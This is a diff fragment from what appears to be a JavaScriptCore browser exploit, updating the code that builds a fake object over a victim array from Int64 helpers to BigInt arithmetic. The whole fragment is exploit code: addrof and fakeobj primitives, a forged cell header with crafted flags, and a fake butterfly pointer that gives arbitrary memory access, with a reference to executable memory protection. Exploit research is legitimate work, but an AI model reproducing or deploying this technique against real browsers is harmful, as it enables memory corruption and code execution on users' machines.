@@ -578,7 +578,7 @@ var VM_PROT_EXECUTE = 0x4
     //port.postMessage("[+] victim @ "+ addrof(victim).toString());
 
     // craft a fake object to modify victim
-    var flags_double_array = new Int64("0x0108200700001000").asJSValue();
+    var flags_double_array = bigint2float(unboxDouble(0x0108200700001000n))//new Int64("0x0108200700001000").asJSValue();
     var container = {
         header: flags_double_array,
         butterfly: victim
@@ -588,7 +588,7 @@ var VM_PROT_EXECUTE = 0x4
     var containerAddr = addrof(container);
     port.postMessage("[+] container @ "+ containerAddr.toString());
     // add the offset to let compiler recognize fake structure
-    var hax = fakeobj(Add(containerAddr,new Int64(0x10)));
+    var hax = fakeobj(containerAddr+0x10n);
     var origButterfly = hax[1];
 
     var memory = {
